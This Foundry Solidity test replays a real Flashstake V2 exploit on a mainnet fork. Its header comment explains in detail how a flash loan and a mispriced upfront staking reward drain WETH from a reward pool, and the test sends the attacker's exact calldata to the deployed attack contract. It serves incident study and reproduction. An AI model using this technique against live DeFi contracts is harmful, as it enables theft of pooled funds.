// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";

// Flashstake V2 — mispriced upfront-reward extraction from the FLASH/WETH reward pool — Ethereum
// ~0.55 WETH drained from the reward pool; attacker net profit ~0.4284 ETH (~$696) in one tx.
//
// Exploit tx  : 0xe3a7bd727174526096ebb51672cd3f801fc03ff984d351673373df6b0c166393 (block 25798654)
// Caller EOA  : 0xa521f8c249eb055796B765642Eed78c01CD620D1 (nonce 1, plain EOA, tx.origin)
// Attack ctrt : 0xfA9D717678DdAf60A123c6Ba0506521e923793d0 (entry, selector 0xb4969dfa)
// Victim pool : 0xC9fc5a6007c9801ebae1813D4D03208C4E85be44 (Flashstake FLASH/WETH reward pool)
//
// Protocol addresses touched:
//   FlashProtocol : 0x15EB0c763581329C921C8398556EcFf85Cc48275 (stake entry point)
//   FlashApp      : 0xb0aeae6E204Bd95911EaD25263d7078954fb7fB0 (reward receiver; also AMP->FLASH converter)
//   FLASH (new)   : 0x20398aD62bb2D930646d45a6D4292baa0b860C1f
//   AMP (legacy)  : 0xfF20817765cB7f73d4bde2e66e067E58D11095C2 (converted 1:1-ish into FLASH)
//   WETH          : 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2
//   Uni V4 Mgr    : 0x000000000004444c5dc75cB358380D2e3dE08A90 (native-ETH flash source via unlock/take/settle)
//   DODO pool     : 0x4D48078Fa76D2CebCfde0d20a0Dc2d7E5373EefE (WETH->FLASH)
//   Uni V2 pair   : 0x08650bb9dc722C9c8C62E79C2BAfA2d3fc5B3293 (WETH->AMP)
//   Uni V2 pair   : 0x31d9b2D096C7aBD1Cf9a3CC8f1982E5FFCA09C47 (WETH->FLASH)
//
// Root cause (reproducible contract mechanism, verified against the on-chain trace, NOT a
// key/signer/privileged-claim compromise):
//   FlashProtocol.stake() computes the minted FLASH reward purely from the deposited FLASH
//   quantity, the lock duration and the protocol's own FLASH balance / total supply
//   (getFPY reads only balanceOf(protocol) and totalSupply()). FLASH is never valued against any
//   external market price. When FlashApp is passed as the reward receiver (_fTokenTo), stake()
//   mints the upfront reward straight to FlashApp and calls FlashApp.receiveFlash(), which
//   immediately forwards the freshly minted FLASH into the FLASH/WETH reward pool and calls the
//   pool's stakeWithFeeRewardDistribution(), paying out real WETH to the attacker in the same call.
//   So cheaply-acquired FLASH (bought on the open market + legacy AMP converted to FLASH) is locked
//   to mint upfront reward FLASH at the protocol's internal unit-based rate, then that reward is
//   dumped into the pool's WETH reserve for real value. No oracle, no vesting, no cooldown, no cap.
//
// Trace evidence (18-decimal FLASH/WETH/AMP):
//   - 10 ETH taken from the Uni V4 PoolManager as a flash loan, wrapped to WETH.
//   - ~0.11679 WETH spent to acquire 296,288 FLASH (DODO 153,318 + Uni V2 38,872 + AMP-convert 104,096).
//   - FlashProtocol.stake(296,288 FLASH, 56,429,000s ~= 653 days, receiver = FlashApp).
//   - stake mints 145,125 FLASH reward straight to FlashApp (log FlashToken.mint -> FlashApp).
//   - FlashApp.receiveFlash forwards 145,125 FLASH into the reward pool 0xC9fc5a6...
//   - pool.stakeWithFeeRewardDistribution pays 0.545290142368948671 WETH to the attacker.
//   - flash loan repaid (WETH unwrapped, PoolManager.settle{value:10 ETH}); ~0.4284 ETH remains.
//   - attack contract forwards 0.428499986522887147 ETH to the caller EOA.
//   Reward-pool WETH reserve fell ~28% (0.545 WETH out). No external price feed was manipulated —
//   the mispriced reward pool itself is the extraction sink.
//
// Every function invoked (unlock, take, settle, the swaps, the AMP->FLASH convert, stake,
// receiveFlash, stakeWithFeeRewardDistribution) is a plain permissionless public call. The tx
// originates from a normal EOA calling the attack contract; no admin role, signer, or owner path.
//
// Self-contained: one flash-loan-funded tx. The attack contract (6,269 bytes) already exists in
// fork state at block-1 (EOA nonce is already 1 there), so no same-block setup is needed.
//
// Faithful reproduction: fork at block-1 and replay the EXACT original tx — prank the caller EOA
// as BOTH msg.sender AND tx.origin and low-level call the already-deployed attack contract with the
// EXACT original calldata (hardcoded verbatim below, no reconstruction). Assert the EOA's net ETH gain.
//
// Run (Uni V4 PoolManager uses transient storage, so cancun is required; the repo default
// evm_version is shanghai, under which the replay reverts with EvmError: NotActivated):
//   forge test --contracts ./src/test/2026-08/FlashstakeV2_exp.sol --evm-version cancun -vvv

contract FlashstakeV2_exp is Test {
    address internal constant CALLER = 0xa521f8c249eb055796B765642Eed78c01CD620D1;
    address internal constant ATTACK = 0xfA9D717678DdAf60A123c6Ba0506521e923793d0;
    address internal constant REWARD_POOL = 0xC9fc5a6007c9801ebae1813D4D03208C4E85be44;
    address internal constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;

    // Exact calldata of the original exploit tx (selector 0xb4969dfa + args), verbatim.
    bytes internal constant EXPLOIT_CALLDATA =
        hex"b4969dfa000000000000000000000000000000000000000000000000000000000000006000000000000000000000000000000000000000000000000000000000000000c00000000000000000000000000000000000000000000000000000000000000180000000000000000000000000000000000000000000000000000000000000000200000000000000000000000020398ad62bb2d930646d45a6d4292baa0b860c1f000000000000000000000000ff20817765cb7f73d4bde2e66e067e58d11095c200000000000000000000000000000000000000000000000000000000000000050000000000000000000000004d48078fa76d2cebcfde0d20a0dc2d7e5373eefe00000000000000000000000008650bb9dc722c9c8c62e79c2bafa2d3fc5b329300000000000000000000000031d9b2d096c7abd1cf9a3cc8f1982e5ffca09c47000000000000000000000000b0aeae6e204bd95911ead25263d7078954fb7fb000000000000000000000000015eb0c763581329c921c8398556ecff85cc48275000000000000000000000000000000000000000000000000000000000000000300000000000000000000000000000000000000000000000000d76fc23b2e00000000000000000000000000000000000000000000000034f086f3b33b68400000000000000000000000000000000000000000000000000000002f76d966330000";

    function setUp() public {
        // block-1: real protocol state before the exploit tx executed.
        vm.createSelectFork("mainnet", 25798653);
    }

    function testExploit() public {
        uint256 poolBefore = _wethBal(REWARD_POOL);
        uint256 ethBefore = CALLER.balance;
        emit log_named_decimal_uint("attacker ETH before", ethBefore, 18);
        emit log_named_decimal_uint("reward pool WETH before", poolBefore, 18);

        // Replay the exact original tx: caller EOA is both msg.sender and tx.origin.
        vm.prank(CALLER, CALLER);
        (bool ok,) = ATTACK.call(EXPLOIT_CALLDATA);
        require(ok, "replay failed");

        uint256 poolLoss = poolBefore - _wethBal(REWARD_POOL);
        uint256 profit = CALLER.balance - ethBefore; // net ETH forwarded to the EOA by the attack contract

        emit log_named_decimal_uint("attacker ETH after", CALLER.balance, 18);
        emit log_named_decimal_uint("reward pool WETH after", _wethBal(REWARD_POOL), 18);
        emit log_named_decimal_uint("reward pool WETH drained", poolLoss, 18);
        emit log_named_decimal_uint("attacker net profit (ETH)", profit, 18);

        // Attacker net profit ~0.4284 ETH (reported), reward pool lost ~0.5453 WETH.
        assertApproxEqAbs(profit, 0.4284 ether, 0.001 ether, "profit off reported ~0.4284 ETH");
        assertApproxEqAbs(poolLoss, 0.545290142368948671 ether, 1e15, "pool loss off traced ~0.5453 WETH");
    }

    function _wethBal(address who) internal view returns (uint256) {
        (bool ok, bytes memory d) = WETH.staticcall(abi.encodeWithSignature("balanceOf(address)", who));
        require(ok, "balanceOf failed");
        return abi.decode(d, (uint256));
    }
}
